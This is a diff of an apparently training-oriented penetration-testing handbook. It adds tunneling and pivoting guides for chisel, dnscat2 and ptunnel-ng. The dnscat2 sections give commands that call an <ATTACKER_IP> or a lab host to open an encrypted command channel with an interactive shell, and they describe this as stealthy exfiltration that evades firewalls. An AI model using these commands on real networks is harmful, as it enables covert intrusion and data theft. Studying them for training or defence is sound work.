@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-63b31448.js";
+            window.path_to_searchindex_js = "searchindex-16137b64.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-38b3d167.js"></script>
+        <script src="toc-fada16db.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -190,8 +190,10 @@
 <ul>
 <li><a href="#api-architectural-styles">API Architectural Styles</a></li>
 <li><a href="#cap-theorem">cap theorem</a></li>
+<li><a href="#chisel">chisel</a></li>
 <li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
 <li><a href="#dig">dig</a></li>
+<li><a href="#dnscat2">dnscat2</a></li>
 <li><a href="#enum4linux-cheatsheet">enum4linux</a></li>
 <li><a href="#ettercap">ettercap</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
@@ -213,6 +215,7 @@
 <li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#nmap-cheatsheet">nmap</a></li>
 <li><a href="#powershell-file-transfer">powershell</a></li>
+<li><a href="#ptunnel-ng">ptunnel-ng</a></li>
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#ranger-cheatsheet">Ranger</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
@@ -440,6 +443,9 @@
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
 <li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
 <li><a href="#meterpreter-tunneling--port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</a></li>
+<li><a href="#dns-tunneling-with-dnscat2">DNS Tunneling with Dnscat2</a></li>
+<li><a href="#socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</a></li>
+<li><a href="#icmp-tunneling-with-ptunnel-ng">ICMP Tunneling with ptunnel-ng</a></li>
 </ul>
 </li>
 </ul>
@@ -659,8 +665,10 @@
 <ul>
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
 <li><a href="#cap-theorem">cap_theorem</a></li>
+<li><a href="#chisel">chisel</a></li>
 <li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
 <li><a href="#dig">dig</a></li>
+<li><a href="#dnscat2">dnscat2</a></li>
 <li><a href="#enum4linux-cheatsheet">enum4linux</a></li>
 <li><a href="#ettercap">ettercap</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
@@ -683,6 +691,7 @@
 <li><a href="#nikto-cheatsheet">nikto</a></li>
 <li><a href="#nmap-cheatsheet">nmap</a></li>
 <li><a href="#powershell-file-transfer">powershell</a></li>
+<li><a href="#ptunnel-ng">ptunnel-ng</a></li>
 <li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
 <li><a href="#ranger-cheatsheet">ranger</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
@@ -746,6 +755,69 @@
 </ul>
 <p><img src="cheatsheets/images/cap_theorem/partition_tolerance.png" alt=""></p>
 </li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="chisel"><a class="header" href="#chisel">chisel</a></h1>
+<p>TCP/UDP tunneling tool written in Go. Transports data over HTTP, secured with SSH. Supports SOCKS5 proxying and port forwarding.</p>
+<h2 id="install"><a class="header" href="#install">Install</a></h2>
+<pre><code class="language-bash">git clone https://github.com/jpillora/chisel.git
+cd chisel &amp;&amp; go build
+</code></pre>
+<p>Or grab a prebuilt binary from <a href="https://github.com/jpillora/chisel/releases">Releases</a>.</p>
+<h2 id="forward-socks5-tunnel"><a class="header" href="#forward-socks5-tunnel">Forward SOCKS5 Tunnel</a></h2>
+<p>Server on pivot host, client on attack host:</p>
+<pre><code class="language-bash"># Pivot host
+./chisel server -v -p 1234 --socks5
+
+# Attack host
+./chisel client -v &lt;PIVOT_IP&gt;:1234 socks
+</code></pre>
+<h2 id="reverse-socks5-tunnel"><a class="header" href="#reverse-socks5-tunnel">Reverse SOCKS5 Tunnel</a></h2>
+<p>Server on attack host, client on pivot host:</p>
+<pre><code class="language-bash"># Attack host
+sudo ./chisel server --reverse -v -p 1234 --socks5
+
+# Pivot host
+./chisel client -v &lt;ATTACKER_IP&gt;:1234 R:socks
+</code></pre>
+<h2 id="port-forwarding"><a class="header" href="#port-forwarding">Port Forwarding</a></h2>
+<p>Forward a specific port through the tunnel:</p>
+<pre><code class="language-bash"># Forward local 8080 to remote 80
+./chisel client &lt;SERVER_IP&gt;:1234 8080:&lt;TARGET_IP&gt;:80
+
+# Reverse: expose remote port locally
+./chisel client &lt;SERVER_IP&gt;:1234 R:8080:&lt;TARGET_IP&gt;:80
+</code></pre>
+<h2 id="proxychains-integration"><a class="header" href="#proxychains-integration">Proxychains Integration</a></h2>
+<p>Add to <code>/etc/proxychains.conf</code>:</p>
+<pre><code>[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<p>Then use:</p>
+<pre><code class="language-bash">proxychains xfreerdp /v:&lt;TARGET_IP&gt; /u:&lt;USER&gt; /p:&lt;PASS&gt;
+proxychains nmap -sT &lt;TARGET_IP&gt;
+</code></pre>
+<h2 id="common-flags"><a class="header" href="#common-flags">Common Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-v</code></td><td>Verbose output</td></tr>
+<tr><td><code>-p</code></td><td>Server listen port</td></tr>
+<tr><td><code>--socks5</code></td><td>Enable SOCKS5 proxy</td></tr>
+<tr><td><code>--reverse</code></td><td>Allow reverse tunnels (server-side)</td></tr>
+<tr><td><code>R:socks</code></td><td>Reverse SOCKS5 remote (client-side)</td></tr>
+<tr><td><code>--auth</code></td><td>Set username:password for authentication</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="notes"><a class="header" href="#notes">Notes</a></h2>
+<ul>
+<li>Default SOCKS5 proxy port is 1080</li>
+<li>Transfer binary to pivot host via <code>scp</code>, <code>wget</code>, or other file transfer method</li>
+<li>Mind binary size for stealth; consider <code>go build -ldflags="-s -w"</code> to shrink it</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="crackmapexec-cme-cheatsheet"><a class="header" href="#crackmapexec-cme-cheatsheet">CrackMapExec (CME) Cheatsheet</a></h1>
@@ -1083,6 +1155,56 @@ dig example.com NS +short
 # Get MX records with priority
 dig example.com MX +noall +answer | awk '{print $5, $6}'
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="dnscat2"><a class="header" href="#dnscat2">dnscat2</a></h1>
+<p>DNS tunneling tool that sends data between two hosts using DNS TXT records over an encrypted C2 channel.</p>
+<h2 id="install-server"><a class="header" href="#install-server">Install (Server)</a></h2>
+<pre><code class="language-bash">git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+</code></pre>
+<h2 id="start-server"><a class="header" href="#start-server">Start Server</a></h2>
+<pre><code class="language-bash">sudo ruby dnscat2.rb --dns host=&lt;ATTACKER_IP&gt;,port=53,domain=&lt;DOMAIN&gt; --no-cache
+</code></pre>
+<p>The server outputs a <code>--secret</code> key for client authentication.</p>
+<h2 id="client-powershell"><a class="header" href="#client-powershell">Client (PowerShell)</a></h2>
+<p>Clone <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a> and transfer <code>dnscat2.ps1</code> to target.</p>
+<pre><code class="language-powershell">Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver &lt;ATTACKER_IP&gt; -Domain &lt;DOMAIN&gt; -PreSharedSecret &lt;SECRET&gt; -Exec cmd
+</code></pre>
+<h2 id="client-native"><a class="header" href="#client-native">Client (Native)</a></h2>
+<pre><code class="language-bash">./dnscat --secret=&lt;SECRET&gt; &lt;DOMAIN&gt;
+</code></pre>
+<p>Or connect directly without a domain:</p>
+<pre><code class="language-bash">./dnscat --dns server=&lt;ATTACKER_IP&gt;,port=53 --secret=&lt;SECRET&gt;
+</code></pre>
+<h2 id="session-management"><a class="header" href="#session-management">Session Management</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>windows</code></td><td>List active sessions/windows</td></tr>
+<tr><td><code>window -i &lt;id&gt;</code></td><td>Interact with a session</td></tr>
+<tr><td><code>kill &lt;id&gt;</code></td><td>Kill a session</td></tr>
+<tr><td><code>quit</code></td><td>Exit dnscat2</td></tr>
+<tr><td><code>tunnels</code></td><td>List active tunnels</td></tr>
+<tr><td><code>help</code></td><td>Show available commands</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="interactive-shell"><a class="header" href="#interactive-shell">Interactive Shell</a></h2>
+<pre><code>dnscat2&gt; window -i 1
+</code></pre>
+<p>Use <code>ctrl-z</code> to return to the dnscat2 prompt.</p>
+<h2 id="notes-1"><a class="header" href="#notes-1">Notes</a></h2>
+<ul>
+<li>Uses UDP port 53 by default</li>
+<li>All sessions are encrypted when using <code>--secret</code> / <code>-PreSharedSecret</code></li>
+<li>Useful for environments where HTTPS is stripped/inspected but DNS is allowed out</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="enum4linux-cheatsheet"><a class="header" href="#enum4linux-cheatsheet">enum4linux Cheatsheet</a></h1>
 <p>Tool for enumerating information from Windows and Samba systems via SMB.</p>
@@ -1667,7 +1789,7 @@ fierce --domain example.com --delay 1
 # Use verbose mode for debugging
 fierce --domain example.com --verbose
 </code></pre>
-<h2 id="notes"><a class="header" href="#notes">Notes</a></h2>
+<h2 id="notes-2"><a class="header" href="#notes-2">Notes</a></h2>
 <ul>
 <li>Fierce first attempts zone transfers on all discovered name servers</li>
 <li>If zone transfer fails, it falls back to subdomain brute-forcing</li>
@@ -1986,7 +2108,7 @@ hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 <hr>
 <h2 id="impacket-psexec"><a class="header" href="#impacket-psexec">impacket-psexec</a></h2>
 <p>Remote command execution using RemComSvc.</p>
-<h3 id="interactive-shell"><a class="header" href="#interactive-shell">Interactive Shell</a></h3>
+<h3 id="interactive-shell-1"><a class="header" href="#interactive-shell-1">Interactive Shell</a></h3>
 <pre><code class="language-bash">impacket-psexec administrator:'Password123'@10.10.10.10
 </code></pre>
 <h3 id="execute-command"><a class="header" href="#execute-command">Execute Command</a></h3>
@@ -2001,7 +2123,7 @@ hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 <hr>
 <h2 id="impacket-smbexec"><a class="header" href="#impacket-smbexec">impacket-smbexec</a></h2>
 <p>Similar to psexec but doesn’t upload binary. Uses local SMB server for output.</p>
-<h3 id="interactive-shell-1"><a class="header" href="#interactive-shell-1">Interactive Shell</a></h3>
+<h3 id="interactive-shell-1-1"><a class="header" href="#interactive-shell-1-1">Interactive Shell</a></h3>
 <pre><code class="language-bash">impacket-smbexec administrator:'Password123'@10.10.10.10
 </code></pre>
 <h3 id="with-share"><a class="header" href="#with-share">With Share</a></h3>
@@ -4162,6 +4284,57 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 </ul>
 </li>
 <li><code>Test-NetConnection</code>: Test network connectivity to a remote host</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ptunnel-ng"><a class="header" href="#ptunnel-ng">ptunnel-ng</a></h1>
+<p>ICMP tunneling tool that encapsulates TCP traffic within ICMP echo request/response packets. Useful when ICMP is allowed but other protocols are blocked.</p>
+<h2 id="install-1"><a class="header" href="#install-1">Install</a></h2>
+<pre><code class="language-bash">git clone https://github.com/utoni/ptunnel-ng.git
+cd ptunnel-ng
+sudo ./autogen.sh
+</code></pre>
+<h3 id="static-binary"><a class="header" href="#static-binary">Static Binary</a></h3>
+<pre><code class="language-bash">sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+</code></pre>
+<h2 id="transfer-to-target"><a class="header" href="#transfer-to-target">Transfer to Target</a></h2>
+<pre><code class="language-bash">scp -r ptunnel-ng ubuntu@&lt;PIVOT_IP&gt;:~/
+</code></pre>
+<h2 id="server-pivot-host"><a class="header" href="#server-pivot-host">Server (Pivot Host)</a></h2>
+<pre><code class="language-bash">sudo ./ptunnel-ng -r&lt;PIVOT_IP&gt; -R22
+</code></pre>
+<h2 id="client-attack-host"><a class="header" href="#client-attack-host">Client (Attack Host)</a></h2>
+<pre><code class="language-bash">sudo ./ptunnel-ng -p&lt;PIVOT_IP&gt; -l2222 -r&lt;PIVOT_IP&gt; -R22
+</code></pre>
+<h2 id="ssh-through-the-tunnel"><a class="header" href="#ssh-through-the-tunnel">SSH Through the Tunnel</a></h2>
+<pre><code class="language-bash">ssh -p2222 -lubuntu 127.0.0.1
+</code></pre>
+<h2 id="dynamic-port-forwarding--proxychains"><a class="header" href="#dynamic-port-forwarding--proxychains">Dynamic Port Forwarding + Proxychains</a></h2>
+<pre><code class="language-bash">ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+proxychains nmap -sV -sT &lt;TARGET_IP&gt; -p3389
+</code></pre>
+<h2 id="flags"><a class="header" href="#flags">Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-r</code></td><td>Address to accept connections / forward to</td></tr>
+<tr><td><code>-R</code></td><td>TCP port to forward traffic to</td></tr>
+<tr><td><code>-p</code></td><td>Address of the ptunnel-ng server</td></tr>
+<tr><td><code>-l</code></td><td>Local listening port</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
+<ul>
+<li>Requires root/sudo (raw ICMP sockets)</li>
+<li>Only works when ICMP echo is permitted through the firewall</li>
+<li>Ensure glibc versions match between hosts, or build a static binary</li>
+<li>Traffic appears as ICMP in Wireshark, not TCP/SSH</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pypykatz-cheatsheet"><a class="header" href="#pypykatz-cheatsheet">pypykatz Cheatsheet</a></h1>
@@ -22282,6 +22455,9 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
 <li><a href="#ssh-remotereverse-port-forwarding">SSH Remote Port Forwarding</a></li>
 <li><a href="#meterpreter-tunneling--port-forwarding">Meterpreter Tunneling &amp; Port Forwarding</a></li>
+<li><a href="#dns-tunneling-with-dnscat2">DNS Tunneling with Dnscat2</a></li>
+<li><a href="#socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</a></li>
+<li><a href="#icmp-tunneling-with-ptunnel-ng">ICMP Tunneling with ptunnel-ng</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h1>
@@ -22772,6 +22948,164 @@ C:\&gt;
 <li>Need reverse port forwarding for internal hosts that cannot reach the attack host directly</li>
 <li>Prefer Metasploit’s integrated tooling over manual SSH tunnels</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="dns-tunneling-with-dnscat2"><a class="header" href="#dns-tunneling-with-dnscat2">DNS Tunneling with Dnscat2</a></h1>
+<p>Dnscat2 is a tunneling tool that uses the DNS protocol to send data between two hosts. It uses an encrypted Command-and-Control (C2) channel and sends data inside TXT records within the DNS protocol.</p>
+<h2 id="how-it-works-1"><a class="header" href="#how-it-works-1">How It Works</a></h2>
+<p>In a typical corporate Active Directory environment, a local DNS server resolves hostnames to IP addresses and routes traffic to external DNS servers. With dnscat2, address resolution is requested from an external server controlled by the attacker. When the local DNS server tries to resolve an address, data is exfiltrated over the network instead of a legitimate DNS request being made.</p>
+<p>This makes dnscat2 an extremely stealthy approach to data exfiltration, as it can evade firewall detections that strip HTTPS connections and sniff traffic.</p>
+<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
+<h3 id="server-attack-host"><a class="header" href="#server-attack-host">Server (Attack Host)</a></h3>
+<p>Clone and install dnscat2:</p>
+<pre><code class="language-bash">git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+</code></pre>
+<p>Start the dnscat2 server:</p>
+<pre><code class="language-bash">sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+</code></pre>
+<p>The server will output a <strong>secret key</strong> needed to authenticate and encrypt the client connection:</p>
+<pre><code>./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+</code></pre>
+<h3 id="client-target-host"><a class="header" href="#client-target-host">Client (Target Host)</a></h3>
+<p>For Windows targets, use the <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a> client.</p>
+<p>Clone it on the attack host, then transfer <code>dnscat2.ps1</code> to the target:</p>
+<pre><code class="language-bash">git clone https://github.com/lukebaggett/dnscat2-powershell.git
+</code></pre>
+<p>On the target, import and run the client:</p>
+<pre><code class="language-powershell">Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+</code></pre>
+<p>The <code>-PreSharedSecret</code> must match the secret generated by the server to establish an encrypted session.</p>
+<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
+<p>Once a session is established, the server will confirm:</p>
+<pre><code>Session 1 Security: ENCRYPTED AND VERIFIED!
+</code></pre>
+<h3 id="available-commands"><a class="header" href="#available-commands">Available Commands</a></h3>
+<pre><code>dnscat2&gt; ?
+* echo
+* help
+* kill
+* quit
+* set
+* start
+* stop
+* tunnels
+* unset
+* window
+* windows
+</code></pre>
+<h3 id="interacting-with-a-session"><a class="header" href="#interacting-with-a-session">Interacting with a Session</a></h3>
+<pre><code class="language-bash">dnscat2&gt; window -i 1
+</code></pre>
+<p>This drops into the established session, giving you an interactive shell on the target. Use <code>ctrl-z</code> to return to the dnscat2 prompt.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="socks5-tunneling-with-chisel"><a class="header" href="#socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</a></h1>
+<p>Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data secured with SSH. It can create client-server tunnel connections in firewall-restricted environments.</p>
+<h2 id="how-it-works-2"><a class="header" href="#how-it-works-2">How It Works</a></h2>
+<p>Chisel creates an HTTP-based tunnel secured with SSH between a client and server. When using SOCKS5 mode, the server listens on a port and forwards traffic to all networks accessible from the pivot host. The client connects and opens a local SOCKS5 proxy (default port 1080) that routes traffic through the tunnel.</p>
+<p>This is useful when the attack host and target network are on different segments, but a compromised pivot host has access to both.</p>
+<h2 id="setup-1"><a class="header" href="#setup-1">Setup</a></h2>
+<h3 id="building-chisel"><a class="header" href="#building-chisel">Building Chisel</a></h3>
+<pre><code class="language-bash">git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> glibc version mismatches between target and workstation can cause errors. Use a prebuilt binary from the <a href="https://github.com/jpillora/chisel/releases">Releases</a> page if needed.</p>
+</blockquote>
+<p>Transfer the binary to the pivot host:</p>
+<pre><code class="language-bash">scp chisel ubuntu@&lt;PIVOT_IP&gt;:~/
+</code></pre>
+<h2 id="forward-pivot"><a class="header" href="#forward-pivot">Forward Pivot</a></h2>
+<p>Run the server on the <strong>pivot host</strong>, client on the <strong>attack host</strong>. Use this when inbound connections to the pivot host are allowed.</p>
+<h3 id="server-pivot-host-1"><a class="header" href="#server-pivot-host-1">Server (Pivot Host)</a></h3>
+<pre><code class="language-bash">./chisel server -v -p 1234 --socks5
+</code></pre>
+<h3 id="client-attack-host-1"><a class="header" href="#client-attack-host-1">Client (Attack Host)</a></h3>
+<pre><code class="language-bash">./chisel client -v &lt;PIVOT_IP&gt;:1234 socks
+</code></pre>
+<p>The client starts a local SOCKS5 proxy on <code>127.0.0.1:1080</code>.</p>
+<h2 id="reverse-pivot"><a class="header" href="#reverse-pivot">Reverse Pivot</a></h2>
+<p>Run the server on the <strong>attack host</strong>, client on the <strong>pivot host</strong>. Use this when firewall rules restrict inbound connections to the pivot host.</p>
+<h3 id="server-attack-host-1"><a class="header" href="#server-attack-host-1">Server (Attack Host)</a></h3>
+<pre><code class="language-bash">sudo ./chisel server --reverse -v -p 1234 --socks5
+</code></pre>
+<h3 id="client-pivot-host"><a class="header" href="#client-pivot-host">Client (Pivot Host)</a></h3>
+<pre><code class="language-bash">./chisel client -v &lt;ATTACKER_IP&gt;:1234 R:socks
+</code></pre>
+<p>The <code>R:socks</code> remote listens on the server’s default SOCKS5 port (1080) and terminates at the client’s internal proxy.</p>
+<h2 id="using-the-tunnel-with-proxychains"><a class="header" href="#using-the-tunnel-with-proxychains">Using the Tunnel with Proxychains</a></h2>
+<p>Edit <code>/etc/proxychains.conf</code>:</p>
+<pre><code>[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+<p>Then route tools through the tunnel:</p>
+<pre><code class="language-bash">proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="icmp-tunneling-with-ptunnel-ng"><a class="header" href="#icmp-tunneling-with-ptunnel-ng">ICMP Tunneling with ptunnel-ng</a></h1>
+<p>ICMP tunneling encapsulates traffic within ICMP packets (echo requests and responses). This only works when ping responses are permitted within the firewalled network. A host that is allowed to ping an external server can encapsulate its traffic within the ping echo request, and the external server validates and responds accordingly.</p>
+<p>This is useful for data exfiltration and creating pivot tunnels when other protocols are blocked.</p>
+<h2 id="how-it-works-3"><a class="header" href="#how-it-works-3">How It Works</a></h2>
+<ul>
+<li>Traffic is encapsulated inside ICMP echo request/response packets</li>
+<li>The ptunnel-ng server runs on the pivot host and listens for incoming ICMP packets</li>
+<li>The ptunnel-ng client runs on the attack host and forwards local TCP traffic through the ICMP tunnel</li>
+<li>SSH can then be layered on top for encrypted access and dynamic port forwarding</li>
+</ul>
+<h2 id="setup-2"><a class="header" href="#setup-2">Setup</a></h2>
+<h3 id="building-ptunnel-ng"><a class="header" href="#building-ptunnel-ng">Building ptunnel-ng</a></h3>
+<pre><code class="language-bash">git clone https://github.com/utoni/ptunnel-ng.git
+cd ptunnel-ng
+sudo ./autogen.sh
+</code></pre>
+<h4 id="static-binary-alternative"><a class="header" href="#static-binary-alternative">Static Binary (Alternative)</a></h4>
+<pre><code class="language-bash">sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+</code></pre>
+<h3 id="transfer-to-pivot-host"><a class="header" href="#transfer-to-pivot-host">Transfer to Pivot Host</a></h3>
+<pre><code class="language-bash">scp -r ptunnel-ng ubuntu@&lt;PIVOT_IP&gt;:~/
+</code></pre>
+<h2 id="usage-1"><a class="header" href="#usage-1">Usage</a></h2>
+<h3 id="server-pivot-host-2"><a class="header" href="#server-pivot-host-2">Server (Pivot Host)</a></h3>
+<pre><code class="language-bash">sudo ./ptunnel-ng -r&lt;PIVOT_IP&gt; -R22
+</code></pre>
+<ul>
+<li><code>-r</code> — IP to accept connections on (the pivot host’s reachable IP)</li>
+<li><code>-R22</code> — the TCP port to forward traffic to (SSH in this case)</li>
+</ul>
+<h3 id="client-attack-host-2"><a class="header" href="#client-attack-host-2">Client (Attack Host)</a></h3>
+<pre><code class="language-bash">sudo ./ptunnel-ng -p&lt;PIVOT_IP&gt; -l2222 -r&lt;PIVOT_IP&gt; -R22
+</code></pre>
+<ul>
+<li><code>-p</code> — IP of the ptunnel-ng server</li>
+<li><code>-l2222</code> — local port to listen on</li>
+<li><code>-r</code> — target address for the tunnel</li>
+<li><code>-R22</code> — target port (SSH)</li>
+</ul>
+<h3 id="ssh-through-the-tunnel-1"><a class="header" href="#ssh-through-the-tunnel-1">SSH Through the Tunnel</a></h3>
+<pre><code class="language-bash">ssh -p2222 -lubuntu 127.0.0.1
+</code></pre>
+<h3 id="dynamic-port-forwarding-over-the-tunnel"><a class="header" href="#dynamic-port-forwarding-over-the-tunnel">Dynamic Port Forwarding Over the Tunnel</a></h3>
+<p>Combine with SSH dynamic port forwarding for proxychains access to the internal network:</p>
+<pre><code class="language-bash">ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+</code></pre>
+<p>Then use proxychains:</p>
+<pre><code class="language-bash">proxychains nmap -sV -sT 172.16.5.19 -p3389
+</code></pre>
+<h2 id="traffic-analysis"><a class="header" href="#traffic-analysis">Traffic Analysis</a></h2>
+<ul>
+<li>Without ICMP tunneling: Wireshark shows TCP and SSHv2 traffic</li>
+<li>With ICMP tunneling: traffic appears as ICMP echo requests/responses only</li>
+<li>ptunnel-ng provides session logs and I/O statistics on both client and server</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> Ensure glibc versions are compatible between attack host and target. If there are mismatches, build a static binary.</p>
+</blockquote>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
 <h2 id="directory-map-15"><a class="header" href="#directory-map-15">Directory Map</a></h2>
@@ -27769,7 +28103,7 @@ $TTL 86400
 <h2 id="zone-transfers"><a class="header" href="#zone-transfers">Zone Transfers</a></h2>
 <p>A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.</p>
 <p>In practice, additional servers called secondary name servers are installed for redundancy. For some Top-Level Domains (TLDs), making zone files accessible on at least two servers is mandatory. DNS entries are generally only created, modified, or deleted on the primary server. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. The slave fetches the SOA record of the relevant zone from the master at certain intervals (refresh time, usually one hour) and compares serial numbers.</p>
-<h4 id="how-it-works-1"><a class="header" href="#how-it-works-1">How it works:</a></h4>
+<h4 id="how-it-works-4"><a class="header" href="#how-it-works-4">How it works:</a></h4>
 <ol>
 <li>Zone Transfer Request (AXFR): The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.</li>
 <li>SOA Record Transfer: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.</li>
@@ -33389,7 +33723,7 @@ setg &lt;option&gt; &lt;value&gt;   # Set global option (persists)
 unset &lt;option&gt;          # Unset option
 unsetg &lt;option&gt;         # Unset global option
 </code></pre>
-<h3 id="session-management"><a class="header" href="#session-management">Session Management</a></h3>
+<h3 id="session-management-1"><a class="header" href="#session-management-1">Session Management</a></h3>
 <pre><code class="language-bash">sessions                # List active sessions
 sessions -i &lt;id&gt;        # Interact with session
 sessions -k &lt;id&gt;        # Kill session
@@ -34080,7 +34414,7 @@ Active sessions
   --  ----  ----                     -----------                 ----------
   1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)
 </code></pre>
-<h3 id="interacting-with-a-session"><a class="header" href="#interacting-with-a-session">Interacting with a Session</a></h3>
+<h3 id="interacting-with-a-session-1"><a class="header" href="#interacting-with-a-session-1">Interacting with a Session</a></h3>
 <p>Use the <code>sessions -i [no.]</code> command to open up a specific session:</p>
 <pre><code class="language-bash">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1
 [*] Starting interaction with 1...
@@ -35453,7 +35787,7 @@ des_cbc_md5          : ...
 <pre><code class="language-sh">unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
 </code></pre>
 <hr>
-<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
+<h2 id="usage-2"><a class="header" href="#usage-2">Usage</a></h2>
 <h3 id="step-1-copy-system-files"><a class="header" href="#step-1-copy-system-files">Step 1: Copy System Files</a></h3>
 <p>Always work with copies to avoid modifying system files:</p>
 <pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
